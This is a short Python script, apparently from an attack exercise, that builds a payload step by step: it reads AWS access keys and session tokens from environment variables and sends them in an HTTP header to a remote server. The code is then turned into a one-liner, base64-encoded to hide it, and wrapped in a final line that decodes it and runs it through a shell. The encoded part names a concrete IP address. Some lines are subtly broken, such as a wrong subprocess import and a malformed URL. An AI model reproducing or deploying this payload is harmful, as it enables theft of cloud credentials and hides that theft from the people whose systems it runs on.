# Payload before Encoding
from asyncio import subprocess
from urllib.request import urlopen, Request
import os

ak = os.getenv('AWS_ACCESS_KEY_ID')
sak = os.getenv('AWS_SECRET_ACCESS_KEY')
st = os.getenv('AWS_SESSION_TOKEN')
egg = f'accesskey {ak}, secret {sak}, token {st}'
url = "http://<ip-address>:<port>:9000"
response = urlopen(Request(url, headers={'env': egg}))

# One Liner
subprocess.run("python3 -c \'from urllib.request import urlopen,Request;import os;ak = os.getenv(\"AWS_ACCESS_KEY_ID\");sak = os.getenv(\"AWS_SECRET_ACCESS_KEY\");st = os.getenv(\"AWS_SESSION_TOKEN\");egg = f\"accesskey {ak}, secret {sak}, token {st}\";url = \"http://<ip-address>:<port>\";response = urlopen(Request(url, headers={\"env\": egg}))\'")

# Encode the oneliner
import base64
encoded = base64.b64encode(b"python3 -c 'from urllib.request import urlopen,Request;import os;ak = os.getenv(\"AWS_ACCESS_KEY_ID\");sak = os.getenv(\"AWS_SECRET_ACCESS_KEY\");st = os.getenv(\"AWS_SESSION_TOKEN\");egg = f\"accesskey {ak}, secret {sak}, token {st}\";url = \"http://<ip-address>:<port>\";response = urlopen(Request(url, headers={\"env\": egg}))'")
print(encoded)

# Final Payload
import subprocess;import base64;subprocess.run(base64.b64decode(b"cHl0aG9uMyAtYyAnZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbixSZXF1ZXN0O2ltcG9ydCBvczthayA9IG9zLmdldGVudigiQVdTX0FDQ0VTU19LRVlfSUQiKTtzYWsgPSBvcy5nZXRlbnYoIkFXU19TRUNSRVRfQUNDRVNTX0tFWSIpO3N0ID0gb3MuZ2V0ZW52KCJBV1NfU0VTU0lPTl9UT0tFTiIpO2VnZyA9IGYiYWNjZXNza2V5IHtha30sIHNlY3JldCB7c2FrfSwgdG9rZW4ge3N0fSI7dXJsID0gImh0dHA6Ly8zLjIzNy4xODIuMjUzOjkwMDAiO3Jlc3BvbnNlID0gdXJsb3BlbihSZXF1ZXN0KHVybCwgaGVhZGVycz17ImVudiI6IGVnZ30pKSc=").decode("utf-8"),shell=True)